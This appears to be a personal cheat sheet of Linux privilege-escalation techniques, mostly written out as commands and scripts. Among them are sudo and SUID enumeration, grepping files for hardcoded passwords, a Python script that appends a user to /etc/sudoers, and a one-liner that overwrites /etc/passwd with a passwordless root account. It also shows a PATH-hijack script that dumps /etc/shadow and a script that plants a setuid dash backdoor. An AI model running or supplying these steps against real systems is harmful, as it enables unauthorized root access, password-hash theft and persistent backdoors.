# GTFO Bins:
GTFOBins is a curated list of Unix binaries that can be exploited by an attacker to bypass local security restrictions.
```
https://gtfobins.github.io/
```

# Commands:
check to see what sudo privledges the user has
```
sudo -l
cat /etc/sudoers
```

# other Super Users?:
```
grep -v -E "^#" /etc/passwd | awk -F: '$3 == 0 {print $1}'
```

# lists available exploits Linux kernel in kali Linux
```
searchsploit Linux Kernel 2.6.24 
```


# Grep hardcoded passwords:
### Use grep to look for user in filename
```
grep -i user [filename]
```
### Use grep to look for pass in filename
```
grep -i pass [filename]
```
### Use grep to look for password in filename
```
grep -C 5 "password" [filename]
```
### find php file and check them for the variable $password
```
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"
```



# root access:
## list all programs this account has sudo access to
```
sudo -l
```

## find all files with SUID & SGID set
```
find . -perm /2000 
find / -perm -4000 -o -perm -2000
find / -perm -u=s -type f 2>/dev/null
find / -perm /6000
find / -perm /6001   
```

## services which are running as root
```
ps -aux | grep root
```

## check if web server runs as root
```
grep "localhost" ./ -R
```

# Add username to sudoers in python.
```
#!/usr/bin/env python

import os
import sys
try:
        os.system('echo "username ALL=(ALL:ALL) ALL" >> /etc/sudoers')
except:
        sys.exit()
```

# Use Python to run script in zip file:
```
mkdir test
echo 'print("Hello World!!") > test/__main__.py
zip -j test.zip test/*
python test.zip
```



## cronjob
If there is a cronjob that runs as root but it has incorrect file permissions, you can change it to run your SUID binary and get a shell.

## list processes running by root, permissions and NFS exports
```
echo 'services running as root'; ps aux | grep root;  echo 'permissions'; ps aux | awk '{print $11}'|xargs -r ls -la 2>/dev/null |awk '!x[$0]++'; echo 'nfs info'; ls -la /etc/exports 2>/dev/null; cat /etc/exports 2>/dev/null
```

# if you have write permissions for /etc/passwd 
back up current/etc/passwd
```
cp /etc/passwd /etc/passwd.bak
```
overwrite /etc/passwd to gain root access
```
echo 'root::0:0:root:/root:/bin/bash' > /etc/passwd; su
```


# ltrace
ltrace to find were a program makes system calls:
find a program with Setuid used
```
find /usr/bin -perm -4000
```
find a program that runs with root priveledges
```
ls -l </path/to/program>
```
try program to see what it requires, maybe try a --help flag. use ltrace to check to see if it calls another script or program that we have access to
```
ltrace </path/to/program> <required options to run>
```
look for system calls where the program is not a specific path for example if it calls grep without specifying a path if so create a script to run:

##Grab Hash script:
```
#!/bin/dash
cat /etc/shadow
```
## **note Bash likes to drop setuid permissions but Dash will not**
make executable 
```
chmod 755 grep
```
change PATH so it check your folder first when the program is run
```
export PATH=.:$PATH
```
run the program that has root priveledges and it should call your script and give you the output


# auto-root script
```
nano grep 
#!/bin/dash
cp /bin/dash backdoor
chown root:root backdoor
chmod u+s backdoor
```
make executable 
```
chmod 755 grep
```
change PATH so it check your folder first when the program is run
```
export PATH=.:$PATH
```
run the program backdoor
```
./backdoor 
whoami
id
```
you now have a root shell in dash

